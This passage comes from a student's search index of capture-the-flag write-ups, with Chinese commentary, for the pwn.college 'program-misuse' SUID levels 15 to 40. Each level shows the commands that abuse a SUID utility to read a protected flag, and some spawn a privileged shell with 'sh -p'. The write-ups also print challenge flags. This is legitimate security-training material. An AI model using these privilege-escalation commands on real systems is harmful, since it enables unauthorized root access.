pwn.college{QvvMGkZ_gpVBCBw1u5dYReqKajl.01N1EDL2QjMyMzW} hacker@program-misuse-level-15:~$","title":"level15 Requires you to understand their output to derive the flag from it!"},{"location":"CSE466/program-misuse/#level16-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"hacker@program-misuse-level-16:~$ sh file.sh Welcome to ./babysuid_level16! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/split. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level16) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/split! split \u662f\u4e00\u4e2a\u5206\u5757\u7684\u5de5\u5177\uff0c\u4f46\u662f\u7531\u4e8e\u9898\u4e2d\u7684flag\u5f88\u5c0f\uff0c\u8fd8\u8fbe\u4e0d\u5230\u5b83\u9ed8\u8ba4\u7684\u9650\u5ea6\uff08\u9ed8\u8ba4\u53c2\u6570\u9700\u8981\u770b\u624b\u518c\uff09\uff0c\u56e0\u6b64\u5728\u8fd0\u884c split /flag \u4e4b\u540e\uff0c\u5c31\u4f1a\u5728\u6587\u4ef6\u5939\u4e4b\u4e0b\u6709\u4e2a\u8f93\u51fa\u6587\u4ef6\u3002 hacker@program-misuse-level-16:~$ cat xaa pwn.college{oqsgCLV3hcD9AXs5bELwauYQHup.0FO1EDL2QjMyMzW} \u5c0f\u603b\u7ed3\uff0c\u9664\u4e86\u6700\u8fd1\u57fa\u672c\u7684\u8fdb\u5236\u3001ascii\u7b49\uff0cbase32\u548cbase64\u6700\u597d\u53ef\u4ee5\u4e86\u89e3\u4e00\u4e0b\u8fd9\u4e24\u79cd\u7f16\u7801\u65b9\u5f0f","title":"level16 Requires you to understand their output to derive the flag from it!"},{"location":"CSE466/program-misuse/#level17-forces-you-to-understand-different-archive-formats","text":"hacker@program-misuse-level-17:~$ sh file.sh Welcome to ./babysuid_level17! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/gzip. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level17) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/gzip! \u725b\u9a6c\u7684 gzip \uff0c\u538b\u7f29\u548c\u89e3\u538b\u7f29\uff0c\u770b\u6765\u540e\u51e0\u4e2a\u90fd\u662f\u8fd9\u4e2a\u610f\u601d \u7136\u540e\u5f00\u59cb\u79d2\u9898 hacker@program-misuse-level-17:~$ gzip -f /flag -t hacker@program-misuse-level-17:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag.gz lib lib64 media opt root sbin sys usr hacker@program-misuse-level-17:~$ gzip -cd /flag.gz pwn.college{QHVq0GV7-f7QFzzNe2jTzkeq6T8.0VO1EDL2QjMyMzW} hacker@program-misuse-level-17:~$","title":"level17 Forces you to understand different archive formats!"},{"location":"CSE466/program-misuse/#level18-forces-you-to-understand-different-archive-formats","text":"\u5f00\u59cb\u65e0\u804a\u8d77\u6765\u4e86\u3002\u3002\u3002 hacker@program-misuse-level-18:~$ sh file.sh Welcome to ./babysuid_level18! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/bzip2. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level18) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/bzip2! \u7136\u540e\u548c\u4e0a\u9762\u7684\u547d\u4ee4\u5b8c\u5168\u4e00\u6837\uff0c\u5c31\u662f\u538b\u7f29\u7684\u683c\u5f0f\u548c\u7b97\u6cd5\u4e0d\u540c\u4e86 hacker@program-misuse-level-18:~$ bzip2 -f /flag hacker@program-misuse-level-18:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag.bz2 lib lib64 media opt root sbin sys usr hacker@program-misuse-level-18:~$ bzip2 -cd /flag.bz2 pwn.college{wkf3JjpEoyTnVUz5mUbAtllNMRn.0FM2EDL2QjMyMzW} hacker@program-misuse-level-18:~$","title":"level18 Forces you to understand different archive formats!"},{"location":"CSE466/program-misuse/#level19-forces-you-to-understand-different-archive-formats","text":"Welcome to ./babysuid_level19! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/zip. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level19) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/zip! \u8fd9\u51e0\u4e2a\u9898\u53ef\u6709\u70b9\u513f\u70e6\u4eba\u4e86\u554a\uff01 hacker@program-misuse-level-19:~$ cat /flag.zip PK V3199flagUT \ufffddBdux pwn.college{YFFLGakdSzjIgW7btl64EaiEyDf.0VM2EDL2QjMyMzW} PK V3199flagUT\ufffddux PKJwhacker@program-misuse-level-19:~$ \u6b63\u786e\u7684\u65b9\u5f0f\u5e94\u8be5\u662f\u5148\u89e3\u538b\uff0c\u4f46\u662f\u8c8c\u4f3c\u80fd\u76f4\u63a5\u770b\uff0c\u6211\u5c31\u6ca1\u7ba1","title":"level19 Forces you to understand different archive formats!"},{"location":"CSE466/program-misuse/#level20-forces-you-to-understand-different-archive-formats","text":"hacker@program-misuse-level-20:~$ sh file.sh Welcome to ./babysuid_level20! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/tar. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level20) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/tar! tar \u6bd4\u8f83\u5e38\u89c1\u3002 hacker@program-misuse-level-20:~$ tar cf /flag.tar /flag tar: Removing leading `/' from member names hacker@program-misuse-level-20:~$ ls / bin challenge etc flag.tar lib lib64 media opt root sbin sys usr boot dev flag home lib32 libx32 mnt proc run srv tmp var hacker@program-misuse-level-20:~$ cat /flag.tar flag0000400000000000000000000000007114456374677010423 0ustar rootrootpwn.college{YNojFHYmMjDXxa2MP_mFcpOEIIo.0lM2EDL2QjMyMzW} hacker@program-misuse-level-20:~$ \u597d\u50cf\u90fd\u53ef\u4ee5\u76f4\u63a5\u7528cat\u770b\u538b\u7f29\u5305\uff0c\u90a3\u4e48\u5c31\u6bd4\u8f83\u7b80\u5355\u4e86","title":"level20 Forces you to understand different archive formats!"},{"location":"CSE466/program-misuse/#level21-forces-you-to-understand-different-archive-formats","text":"hacker@program-misuse-level-21:~$ sh file.sh Welcome to ./babysuid_level21! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/ar. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level21) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ar! ar \u5de5\u5177\uff0c\u96c6\u5408\u5f88\u591a\u6587\u6863\u5b58\u6210\u4e00\u4e2a\u6587\u6863\u7684\u5de5\u5177 hacker@program-misuse-level-21:~$ ar rs /flag.a /flag ar: creating /flag.a hacker@program-misuse-level-21:~$ cat /flag.a !<arch> flag/ 0 0 0 644 57 ` pwn.college{0vq28yii-jRYCSQP_DtM3bkf8ee.01M2EDL2QjMyMzW} hacker@program-misuse-level-21:~$","title":"level21 Forces you to understand different archive formats!"},{"location":"CSE466/program-misuse/#level22-forces-you-to-understand-different-archive-formats","text":"hacker@program-misuse-level-22:~$ sh file.sh Welcome to ./babysuid_level22! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/cpio. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level22) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cpio! cpio \u5de5\u5177\uff0c\u7528\u4e8e\u6587\u4ef6\u5907\u4efd\u7684 hacker@program-misuse-level-22:~$ find /flag | cpio -ov > archive.cpio /flag 1 block hacker@program-misuse-level-22:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag lib lib64 media opt root sbin sys usr hacker@program-misuse-level-22:~$ ls Desktop Downloads Pictures Templates archive.cpio file.sh Documents Music Public Videos core test.py hacker@program-misuse-level-22:~$ cat archive.cpio \ufffdwd\ufffd9/flagpwn.college{om324dLj5vHeY7kTe9p_qAFQ1Cy.0FN2EDL2QjMyMzW} \ufffd TRAILER!!!hacker@program-misuse-level-22:~$","title":"level22 Forces you to understand different archive formats!"},{"location":"CSE466/program-misuse/#level23-forces-you-to-understand-different-archive-formats","text":"hacker@program-misuse-level-23:~$ sh file.sh Welcome to ./babysuid_level23! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/genisoimage. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level23) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/genisoimage! genisoimage \u5de5\u5177\uff0c\u80fd\u770b\u51fa\u6765\u4f5c\u7528\u662f\u5efa\u7acbISO 9660\u6620\u50cf\u6587\u4ef6 er@program-misuse-level-23:~$ genisoimage -sort /flag genisoimage: Incorrect sort file format pwn.college{YROFw7Q_KvLF86Vs3WeI_XDvziT.0VN2EDL2QjMyMzW} hacker@program-misuse-level-23:~$ \u8fd9\u5757\u513f\u597d\u50cfcat\u4e0d\u592a\u661f\u4e86\uff0c\u8f93\u51fa\u4f1a\u6253\u4e71shell \u5c0f\u603b\u7ed3\uff1a\u5012\u662f\u77e5\u9053\u4e86\u5f88\u591a\u4ee5\u524d\u4e0d\u77e5\u9053\u7684\u5de5\u5177\u3002","title":"level23 Forces you to understand different archive formats!"},{"location":"CSE466/program-misuse/#level24-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"sh hacker@program-misuse-level-24:~$ sh file.sh Welcome to ./babysuid_level24! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/env. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level24) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/env! \u5f00\u59cb\u6709\u610f\u601d\u8d77\u6765\u4e86\u3002 hacker@program-misuse-level-24:~$ env cat /flag pwn.college{8rPxiO1f2sBGHUvcT83glFWNSpM.0lN2EDL2QjMyMzW} hacker@program-misuse-level-24:~$ env\u53ef\u4ee5\u7ed9\u5176\u4ed6\u7684\u7a0b\u5e8f\u8d4b\u6743\uff1f\u611f\u89c9\u662f\u8fd9\u4e2a\u610f\u601d\uff0c\u5f53\u7136\u51fa\u9898\u4eba\u60f3\u8981\u7684\u610f\u601d\u5e94\u8be5\u662f\u9700\u8981\u5148\u8bbe\u4e00\u4e2ashell\uff0c\u7136\u540e\u6267\u884c\u3002","title":"level24 Enables you to read flags by making them execute other commands!"},{"location":"CSE466/program-misuse/#level25-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-25:~$ sh file.sh Welcome to ./babysuid_level25! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/find. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level25) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/find! \u4f7f\u7528find hacker@program-misuse-level-25:~$ find / -type f -name \"flag\" -exec cat {} \\; pwn.college{Uomlfru_u94ZuszsvlNzA0n6x39.01N2EDL2QjMyMzW} hacker@program-misuse-level-25:~$ \u8fd9\u91cc\u9700\u8981\u8003\u8651\u7684\u662ffind\u53ea\u662f\u627e\u5230\uff0c\u5982\u4f55\u8bfb\u53d6\uff1f \u4f7f\u7528 -exec","title":"level25 Enables you to read flags by making them execute other commands!"},{"location":"CSE466/program-misuse/#level26-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-26:~$ sh file.sh Welcome to ./babysuid_level26! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/make. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level26) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/make! \u6709\u70b9\u513f\u610f\u601d\u554a\uff0c\u76f4\u63a5\u51fa\u73b0\u4e86GNU Make\u4e86 hacker@program-misuse-level-26:~$ COMMAND='cat /flag';make -s --eval=$'x:\\n\\t-'\"$COMMAND\" pwn.college{oYDGLL2PogQjUYR2TV30VTUm-4z.0FO2EDL2QjMyMzW} hacker@program-misuse-level-26:~$ \u8fd9\u4e2a\u641c\u4e86\u4e00\u4e0b\uff0c\u7136\u540e\u4e0d\u5149\u67e5\u5230\u4e86\u6b63\u786e\u7b54\u6848\u8fd8\u53d1\u73b0\u81ea\u5df1\u505a\u9519\u4e86\uff0c\u51fa\u9898\u4eba\u60f3\u8981\u7684\u662f sh -p \u8fd9\u6837\u63d0\u6743 \u8fd9\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\uff0c\u5e76\u5c06\u8be5\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u5305\u542b\u4ee5\u4e0b\u90e8\u5206\uff1a env\uff1a\u8fd9\u662f\u4e00\u4e2a\u7528\u4e8e\u6267\u884c\u547d\u4ee4\u65f6\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u7684\u5de5\u5177\u3002\u5728\u8fd9\u4e2a\u547d\u4ee4\u4e2d\uff0c\u5b83\u7528\u4e8e\u5c06\u5f53\u524dshell\u8fdb\u7a0b\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\u4f20\u9012\u7ed9\u65b0\u7684shell\u8fdb\u7a0b\u3002 sh\uff1a\u8fd9\u662f\u4e00\u4e2a\u7528\u4e8e\u542f\u52a8shell\u8fdb\u7a0b\u7684\u547d\u4ee4\u3002\u5728\u8fd9\u4e2a\u547d\u4ee4\u4e2d\uff0c\u5b83\u7528\u4e8e\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\u3002 -p\uff1a\u8fd9\u662f\u4e00\u4e2a\u9009\u9879\uff0c\u7528\u4e8e\u544a\u8bc9\u65b0\u7684shell\u8fdb\u7a0b\u5c06\u5176\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u4f1a\u5c06\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u4ece\u73af\u5883\u53d8\u91cf\u6587\u4ef6\uff08\u5982/etc/environment\u3001/etc/profile\u3001~/.bashrc\u7b49\uff09\u4e2d\u8bfb\u53d6\uff0c\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a\u65b0\u7684shell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002 \u56e0\u6b64\uff0c\u8fd9\u4e2a\u547d\u4ee4\u7684\u6548\u679c\u662f\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\uff0c\u5e76\u5c06\u5176\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002\u8fd9\u53ef\u4ee5\u7528\u4e8e\u6d4b\u8bd5shell\u811a\u672c\u6216\u547d\u4ee4\u5bf9\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\uff0c\u6216\u8005\u5728\u4e24\u4e2a\u4e0d\u540c\u7684shell\u8fdb\u7a0b\u4e4b\u95f4\u5171\u4eab\u73af\u5883\u53d8\u91cf\u3002 \u770b\u8d77\u6765\u5c31\u662f\u8d4b\u6743\uff0c\u7136\u540e\u4f1a\u62ff\u5230\u4e00\u4e2a\u65b0\u7684shell\u63d0\u793a\u7b26","title":"level26 Enables you to read flags by making them execute other commands!"},{"location":"CSE466/program-misuse/#level27-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-27:~$ sh file.sh Welcome to ./babysuid_level27! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/nice. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level27) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/nice! nice \u5de5\u5177:\u7528\u4e8e\u4ee5\u6307\u5b9a\u7684\u8fdb\u7a0b\u8c03\u5ea6\u4f18\u5148\u7ea7\u542f\u52a8\u5176\u4ed6\u7684\u7a0b\u5e8f\u3002 hacker@program-misuse-level-27:~$ nice /bin/sh -p # cat /flag pwn.college{celMGA3nJomrVQwA5iPwIY2IORz.0VO2EDL2QjMyMzW} # \u8fd9\u6837\u624d\u662f\u9898\u76ee\u60f3\u8981\u7684\uff0c\u6211\u50bb\u4e86","title":"level27 Enables you to read flags by making them execute other commands!"},{"location":"CSE466/program-misuse/#level28-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-28:~$ sh file.sh Welcome to ./babysuid_level28! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/timeout. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level28) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/timeout! timeout \u5de5\u5177\uff1a\u7528\u6765\u6307\u5b9a\u65f6\u95f4\u540e\u6740\u6b7b\u8fdb\u7a0b\u7684\u3002 hacker@program-misuse-level-28:~$ timeout 1h /bin/sh -p # cat /flag pwn.college{sWxHBmerdB7TO79CXDlkRtygh4x.0FM3EDL2QjMyMzW} # \u8fd9\u4e2a\u9700\u8981\u6ce8\u610f\u6307\u5b9a\u4e00\u4e2a\u65f6\u95f4","title":"level28 Enables you to read flags by making them execute other commands!"},{"location":"CSE466/program-misuse/#level29-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-29:~$ sh file.sh Welcome to ./babysuid_level29! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/stdbuf. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level29) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/stdbuf! stdbuf \u5de5\u5177\uff1a\u4fee\u6539\u6807\u51c6\u6d41\u7684\u7f13\u51b2\u6a21\u5f0f\u548c\u5927\u5c0f hacker@program-misuse-level-29:~$ stdbuf --input=512K /bin/sh -p # cat /flag pwn.college{IHf3mOmt5d10g3StOZp5S0AMAfJ.0VM3EDL2QjMyMzW} # \u522b\u7528man\uff0c\u771f\u7684\u4e0d\u597d\u7528","title":"level29 Enables you to read flags by making them execute other commands!"},{"location":"CSE466/program-misuse/#level30-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-30:~$ sh file.sh Welcome to ./babysuid_level30! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/setarch. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level30) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/setarch! setarch \u5de5\u5177: \u6539\u53d8\u67b6\u6784\u7684\u5de5\u5177 hacker@program-misuse-level-30:~$ setarch i386 /bin/sh -p # cat /flag pwn.college{08T2qH86iHnjvFJb-5bmU9C5kJt.0lM3EDL2QjMyMzW} # \u5b83\u8fd9\u4e2a\u8bf4\u9ed8\u8ba4\u662f/bin/sh\uff0c\u53ef\u4ee5\u5207i386\uff0c\u5728man\u91cc\u5199\u7740\u5462","title":"level30 Enables you to read flags by making them execute other commands!"},{"location":"CSE466/program-misuse/#level31-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-31:~$ sh file.sh Welcome to ./babysuid_level31! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/watch. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level31) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/watch! watch \u5de5\u5177\uff1a\u6267\u884c\u547d\u4ee4\u7136\u540e\u5168\u5c4f\u8f93\u51fa hacker@program-misuse-level-31:~$ watch -x cat /flag ### \u4f7f\u7528\u540e\u4f1a\u8f93\u51fa\u5230\u5168\u5c4f pwn.college{UMl5SVp_YjbBiTIgIIiAi7i_5fg.01M3EDL2QjMyMzW} \u5f88\u795e\u5947\u7684\u5de5\u5177\uff0c\u7136\u800c\u53d1\u73b0tldr\u4e0d\u600e\u4e48\u5168\uff0c\u53ea\u6709\u5e38\u89c1\u547d\u4ee4\uff0c\u5230CTF\u7684\u73af\u5883\u4e4b\u4e2d\u5c31\u4e0d\u592a\u9002\u7528\u4e86","title":"level31 Enables you to read flags by making them execute other commands!"},{"location":"CSE466/program-misuse/#level32-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-32:~$ sh file.sh Welcome to ./babysuid_level32! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/socat. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level32) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/socat! socat \uff1a\u662f\u4e2a\u548csocket\u6709\u5173\u7684\u5de5\u5177\u3002 hacker@program-misuse-level-32:~$ socat -u \"file:/flag\" - pwn.college{QKHthQcoA6ncJKsiqFJMZ6ITybE.0FN3EDL2QjMyMzW} hacker@program-misuse-level-32:~$","title":"level32 Enables you to read flags by making them execute other commands!"},{"location":"CSE466/program-misuse/#level33-requires-some-light-programming-to-read-the-flag","text":"hacker@program-misuse-level-33:~$ sh file.sh Welcome to ./babysuid_level33! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/whiptail. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level33) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/whiptail! whiptail \uff1a\u5c55\u793ashell\u7684\u5bf9\u8bdd\u6846\u7684\u5de5\u5177 hacker@program-misuse-level-33:~$ whiptail --textbox /flag 20 40 pwn.college{4r_plp-YJyPyhT4_GiJQz042S5b.0VN3EDL2QjMyMzW} \u662f\u4e00\u4e2a\u6253\u5f00\u5bf9\u8bdd\u6846\u7684\u5de5\u5177\uff0c\u56e0\u6b64\u601d\u8def\u5c31\u662f\u76f4\u63a5\u5c55\u793a\u51fa\u6765\u5c31\u884c\u4e86\u3002","title":"level33 Requires some light programming to read the flag.!"},{"location":"CSE466/program-misuse/#level34-requires-some-light-programming-to-read-the-flag","text":"hacker@program-misuse-level-34:~$ sh file.sh Welcome to ./babysuid_level34! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/awk. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level34) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/awk! \u8fd9\u6b21\u662f\u4e00\u4e2a\u6211\u4e00\u76f4\u90fd\u4e0d\u600e\u4e48\u4f1a\u7528\u7684\u5de5\u5177\u4e86\u3002\u3002\u3002\u4f60\u5988\u7684 hacker@program-misuse-level-34:~$ awk '{print $1}' /flag pwn.college{ghdjRlnfhKYn-uhIb2N76siNtG_.0lN3EDL2QjMyMzW} hacker@program-misuse-level-34:~$ awk \u662f\u4e00\u4e2a\u5f88\u6709\u7528\u7684\u5de5\u5177\uff0c\u6709\u65f6\u95f4\u8fd8\u662f\u5f97\u5b66\u4e00\u5b66","title":"level34 Requires some light programming to read the flag.!"},{"location":"CSE466/program-misuse/#level35-requires-some-light-programming-to-read-the-flag","text":"hacker@program-misuse-level-35:~$ sh file.sh Welcome to ./babysuid_level35! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/sed. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level35) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/sed! \u679c\u7136\uff0c\u5728awk\u4e4b\u540e\u6211\u5c31\u5e94\u8be5\u60f3\u5230\u662fsed hacker@program-misuse-level-35:~$ sed p /flag pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW} pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW} hacker@program-misuse-level-35:~$ \u4e5f\u8bb8\u6211\u4e4b\u524d\u64cd\u4f5c\u9519\u4e86\u4ec0\u4e48\uff0c\u8fd9\u91cc\u4e0d\u5e94\u8be5\u662f\u4e24\u884cflag\u5427\uff1f","title":"level35 Requires some light programming to read the flag.!"},{"location":"CSE466/program-misuse/#level36-requires-some-light-programming-to-read-the-flag","text":"hacker@program-misuse-level-36:~$ sh file.sh Welcome to ./babysuid_level36! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/ed. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level36) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ed! ed \u5de5\u5177\uff1a\u662f\u4e2a\u7f16\u8f91\u5668\uff0c\u662f\u4ea4\u4e92\u5f0f\u7684 hacker@program-misuse-level-36:~$ ed /flag 57 .p pwn.college{QNXzpWhqr3e12Okfu2KRnY5jyxa.0FO3EDL2QjMyMzW} \u663e\u793a\u5168\u6587","title":"level36 Requires some light programming to read the flag.!"},{"location":"CSE466/program-misuse/#level37-lets-you-get-the-flag-by-doing-tricks-with-permissions","text":"hacker@program-misuse-level-37:~$ sh file.sh Welcome to ./babysuid_level37! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/chown. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level37) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/chown! chown \u5de5\u5177\uff1a\u6539\u53d8\u6587\u4ef6\u7684\u6240\u6709\u8005\u548c\u7ec4\u7684 hacker@program-misuse-level-37:~$ chown hacker /flag hacker@program-misuse-level-37:~$ cat /flag pwn.college{49NDHOhwhBEwWccuPUHSxUU0RIE.0VO3EDL2QjMyMzW} hacker@program-misuse-level-37:~$ \u8fd9\u5c31\u662f\u7b80\u5355\u7684\u8d4b\u6743\u4e86","title":"level37 Lets you get the flag by doing tricks with permissions!"},{"location":"CSE466/program-misuse/#level38-lets-you-get-the-flag-by-doing-tricks-with-permissions","text":"hacker@program-misuse-level-38:~$ sh file.sh Welcome to ./babysuid_level38! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/chmod. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level38) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/chmod! \u8fd9\u4e2a\uff0c\u6ca1\u4eba\u4e0d\u4f1a\u5427 hacker@program-misuse-level-38:~$ chmod 777 /flag hacker@program-misuse-level-38:~$ cat /flag pwn.college{UtH5piA32tLwQLpCFPRDXuFa98r.0FM4EDL2QjMyMzW} hacker@program-misuse-level-38:~$","title":"level38 Lets you get the flag by doing tricks with permissions!"},{"location":"CSE466/program-misuse/#level39-lets-you-get-the-flag-by-doing-tricks-with-permissions","text":"hacker@program-misuse-level-39:~$ sh file.sh Welcome to ./babysuid_level39! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/cp. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level39) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cp! \u4e00\u5f00\u59cb\u60f3\u641e\u4e2a\u786c\u94fe\u63a5\uff0c\u7136\u540e\u53d1\u73b0\u4e0d\u884c\uff0c\u7136\u540e\u8f93\u51fa\u5230 \u6807\u51c6\u8f93\u51fa\u6d41 \u5c31\u884c\u4e86 hacker@program-misuse-level-39:~$ cp /flag /dev/stdout pwn.college{Q2azoEz2fXYLZxYkmGAK4PjtrO7.0VM4EDL2QjMyMzW} hacker@program-misuse-level-39:~$","title":"level39 Lets you get the flag by doing tricks with permissions!"},{"location":"CSE466/program-misuse/#level40-lets-you-get-the-flag-by-doing-tricks-with-permissions","text":"hacker@program-misuse-level-40:~$ sh file.sh Welcome to ./babysuid_level40! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/mv. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/mv! \u8fd9\u9898\uff0c\u5341\u5206\u7684\u79bb\u8c31\u554a\uff0c\u5b8c\u5168\u4e0d\u4f1a\u505a\uff0c\u770b\u7684\u7b54\u6848\uff0c\u5b9e\u5728\u662f\u592a\u9a9a\u6c14\u4e86\uff0c\u4f7f\u7528mv\u628acat\u8986\u76d6mv hacker@program-misuse-level-40:~$ mv /usr/bin/cat /usr/bin/mv hacker@program-misuse-level-40:~$ sh file.sh Welcome to ./babysuid_level40! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/mv. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/mv! hacker@program-misuse-level-40:~$ mv /flag pwn.college{g9AYY8a5E2v4R8jr_434HNFYEL3.0lM4EDL2QjMyMzW} hacker@program-misuse-level-40:~$ ///@TODO:\u8fd9\u4e2a\u503c\u5f97\u8bb0\u5f55\u4e00\u4e0b\uff01 \u8fd9\u4e2a\u9898\u8ba9\u6211\u60f3\u8d77\u4e86\u4e00\u4e2a\u770b\u5230\u7684\u5185\u5bb9\uff1a 